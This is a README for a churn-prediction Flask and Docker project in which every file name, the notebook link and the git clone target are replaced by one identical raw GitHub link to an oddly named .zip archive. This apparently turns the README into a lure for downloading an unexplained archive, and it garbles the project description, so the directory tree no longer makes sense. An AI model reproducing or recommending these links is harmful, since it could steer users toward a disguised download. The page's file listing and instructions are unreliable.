# Churn_Classification

```
├── enocoders_and_scalers        >Stores the encoders and scalers applied on features during training in pickle format
├── templates   
│            ├──https://raw.githubusercontent.com/Parthkh28/Churn_Classification/main/encoders_and_scalers/Classification_Churn_spongiosity.zip      >HTML file             > to track the  large saved  model files using git-lfs
├── https://raw.githubusercontent.com/Parthkh28/Churn_Classification/main/encoders_and_scalers/Classification_Churn_spongiosity.zip                     >flask  application main file
├── dockerfile                 >dockerFile used to automate the process of building a Docker image
├── https://raw.githubusercontent.com/Parthkh28/Churn_Classification/main/encoders_and_scalers/Classification_Churn_spongiosity.zip  >jupyter notebook for churn prediction
├── https://raw.githubusercontent.com/Parthkh28/Churn_Classification/main/encoders_and_scalers/Classification_Churn_spongiosity.zip
├── plots                      >Contains all the plots and visualizations as images
├── models                     >Stores the best_model for Logistic Regression, Random Forest Classification,XGBoost Classification and Neural Network in pickle and h5 format
└── https://raw.githubusercontent.com/Parthkh28/Churn_Classification/main/encoders_and_scalers/Classification_Churn_spongiosity.zip           > Stores the information about all the libraries, modules, and packages in itself that are used while developing the project
```

##### [Link to Kaggle Notebook] (https://raw.githubusercontent.com/Parthkh28/Churn_Classification/main/encoders_and_scalers/Classification_Churn_spongiosity.zip)


The Report is already uploaded in .pdf format during submission

## This Flask app allows users to submit input requests either through an API or a web application form.
https://raw.githubusercontent.com/Parthkh28/Churn_Classification/main/encoders_and_scalers/Classification_Churn_spongiosity.zip
## Docker Deployment
The application and associated files are containerized using Docker, which ensures that it runs consistently across different environments. Docker packages up the application with all of the parts it needs, including the libraries and other dependencies, and ships it all out as one package.
### Build Docker Image
You can build the docker image manually by cloning the Git repo.
```
$ git clone https://raw.githubusercontent.com/Parthkh28/Churn_Classification/main/encoders_and_scalers/Classification_Churn_spongiosity.zip
$ docker build -t churn_prediction .
```
### Download Precreated Image
Alternatively, you can download the existing image from DockerHub.
```
$ docker pull parthkh28/churn_prediction
```
### Run the Container
Create a container from the image.
```
$ docker run --name container  -d -p 5000:5000 churn_prediction
```
In the above example, we are running a docker container with the name my-container in detached mode and mapping port 5000 of the host to port 5000 of the container. The image we are using is churn_prediction.

Now visit http://localhost:5000 to interact with the application.




